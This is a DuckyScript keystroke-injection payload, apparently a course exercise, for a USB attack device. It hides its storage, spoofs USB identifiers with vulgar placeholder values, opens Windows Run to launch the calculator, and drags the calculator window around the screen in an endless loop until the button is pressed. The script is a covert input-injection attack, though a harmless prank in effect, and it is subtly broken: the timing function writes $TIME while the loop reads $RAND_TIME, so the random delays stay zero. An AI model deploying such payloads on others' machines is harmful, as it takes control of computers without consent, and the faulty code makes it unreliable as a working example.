REM TITLE Exercise 11-2
REM AUTHOR Crash
REM_BLOCK DESCRIPTION
   Windows: Hide payload, run windows calculator, then move it around the screen
    erratically. Stop payload execution if the button is pressed
END_REM
HIDE_PAYLOAD
ATTACKMODE HID STORAGE VID_FUCK PID_ICE MAN_FUCK PROD_ICE SERIAL_11111111

VAR $RAND_TIME = 0
VAR $RAND_KEY = 0

FUNCTION GENERATE_TIME ()
    $_RANDOM_MIN = 1000
    $_RANDOM_MAX = 10000
    $TIME = $_RANDOM_INT
END_FUNCTION

FUNCTION GENERATE_KEY ()
    $_RANDOM_MIN = 1
    $_RANDOM_MAX = 4
    $RAND_KEY = $_RANDOM_INT
END_FUNCTION

BUTTON_DEF
    STOP_PAYLOAD
END_BUTTON

DELAY 3000

INJECT_MOD
GUI r
DELAY 250
STRINGLN calc.exe
DELAY 750
INJECT_MOD
ALT SPACE
DELAY 50
m
WHILE TRUE
    GENERATE_KEY()
    GENERATE_TIME()
    IF ( $RAND_KEY == 1 ) THEN
        HOLD UPARROW
        DELAY $RAND_TIME
        RELEASE UPARROW
    ELSE IF ( $RAND_KEY == 2 ) THEN
        HOLD RIGHTARROW
        DELAY $RAND_TIME
        RELEASE RIGHTARROW
    ELSE IF ( $RAND_KEY == 3 ) THEN
        HOLD DOWNARROW
        DELAY $RAND_TIME
        RELEASE DOWNARROW
    ELSE IF ( $RAND_KEY == 4 ) THEN
        HOLD LEFTARROW
        DELAY $RAND_TIME
        RELEASE LEFTARROW
    END_IF
END_WHILE
